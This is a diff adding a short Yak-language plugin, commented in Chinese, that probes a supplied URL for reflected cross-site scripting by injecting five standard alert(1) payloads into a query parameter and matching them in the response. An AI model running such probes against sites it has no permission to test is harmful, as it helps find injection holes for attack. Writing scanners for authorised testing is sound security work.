@@ -1,0 +1,82 @@
+# XSS 检测插件 - 极简版
+__PLUGIN_NAME__ = "XSS检测"
+__PLUGIN_AUTHOR__ = "Yak"
+__PLUGIN_VERSION__ = "1.0.0"
+
+cli.String("target", cli.setRequired(true), cli.setHelp("目标URL"))
+
+# XSS Payloads
+payloads = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "'\"><script>alert(1)</script>",
+    "<svg onload=alert(1)>",
+    "javascript:alert(1)",
+]
+
+# 检测特征
+signatures = [
+    "<script>alert(1)</script>",
+    "onerror=alert(1)",
+    "onload=alert(1)",
+    "javascript:alert(1)",
+]
+
+func checkXSS(target) {
+    for _, payload := range payloads {
+        # 构造测试URL
+        testURL = target
+        if str.Contains(target, "?") {
+            testURL = target + "&x=" + codec.EncodeURL(payload)
+        } else {
+            testURL = target + "?x=" + codec.EncodeURL(payload)
+        }
+        
+        # 发送请求
+        rsp, err = http.Get(testURL, http.timeout(10))
+        if err != nil {
+            continue
+        }
+        
+        body = http.GetBody(rsp)
+        
+        # 检查响应中是否包含未过滤的payload
+        for _, sig := range signatures {
+            if str.Contains(body, sig) {
+                return {
+                    "vulnerable": true,
+                    "payload": payload,
+                    "signature": sig,
+                }
+            }
+        }
+    }
+    
+    return {"vulnerable": false}
+}
+
+target = cli.String("target")
+
+if target == "" {
+    println("用法: yak xss_scan.yak --target <URL>")
+    return
+}
+
+println("[*] 检测目标:", target)
+
+result = checkXSS(target)
+
+if result.vulnerable {
+    println("[+] 发现 XSS 漏洞!")
+    println("    Payload:", result.payload)
+    println("    特征:", result.signature)
+    risk.NewRisk(
+        target,
+        risk.type("xss"),
+        risk.level("medium"),
+        risk.title("XSS 跨站脚本漏洞"),
+        risk.details(result),
+    )
+} else {
+    println("[-] 未发现 XSS 漏洞")
+}
